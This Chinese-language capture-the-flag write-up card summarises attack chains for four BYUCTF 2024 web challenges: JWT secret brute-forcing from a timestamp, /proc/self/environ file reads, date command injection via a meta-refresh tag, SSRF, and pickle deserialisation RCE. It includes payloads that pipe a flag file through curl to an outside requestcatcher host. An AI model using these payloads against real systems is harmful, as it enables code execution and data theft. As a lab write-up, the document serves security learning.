---
title: "BYUCTF 2024/4 题合集"
category: web
tags: ["BYUCTF", "web", "时间戳 secret 爆破", "/proc/self/environ", "secret cookie bypass", "date 命令注入"]
signals: ["BYUCTF 2024", "时间戳 secret 爆破", "/proc/self/environ", "secret cookie bypass", "date 命令注入", "meta refresh SSRF", "XSS requestcatcher", "pickle RCE", "random port 探测", "jwt", "ssrf", "ssti", "deserialize", "JWT"]
difficulty: medium
source: "https://www.ctfiot.com/182726.html"
tools: ["curl"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# BYUCTF 2024/4 题合集

> 赛事：BYUCTF 2024 | 方向：web | 难度：medium | 工具：curl

## 一句话总结

时间戳爆破 JWT secret + meta refresh SSRF + pickle RCE + secret cookie bypass

## 攻击链

1. 题 1: JWT secret = sha256(time_started)，前端响应泄露运行秒数 → 算 time_started → 爆破 secret
2. 用合法 secret 签 userid=0 token，/api/file?filename=/proc/self/environ 读 secret_path
3. 读 /<secret_path>/flag.txt
4. 题 2: /api/date?modifier= 命令注入，但 url 过滤 date 和 %，用 meta refresh 触发
5. payload: <meta http-equiv=refresh content=''0;url=...date?modifier=`cat /ctf/flag.txt|curl ...`''>
6. 通过 /api/stats POST username 存储 XSS payload，再 GET 触发
7. 题 3: /query?url= SSRF（限制 127.0.0.1），用 secret cookie 验证 + URL 解析
8. 利用 SSRF 访问 internal service
9. 题 4: /pickle?pickle=<hex> pickle 反序列化 RCE
10. 写 RCE 类 __reduce__ 返回 os.system
11. 端口 5700-6000 随机，先用 fetch 探测再发 payload

## 关键 payload

```
class RCE: def __reduce__(self): return os.system, (''cat /ctf/flag.txt|curl https://[yours].requestcatcher.com -X POST -d @-'',)
```

## 经验教训

HS256 弱 secret 用 sha256(timestamp) 是常见 CTF 套路；date 命令注入绕过用 meta refresh 不走 URL

## 标签

时间戳 secret 爆破、/proc/self/environ、secret cookie bypass、date 命令注入、meta refresh SSRF、XSS requestcatcher、pickle RCE、random port 探测

## 参考来源

- https://www.ctfiot.com/182726.html
- 原文件：BYUCTF_2024_Writeups.full.md
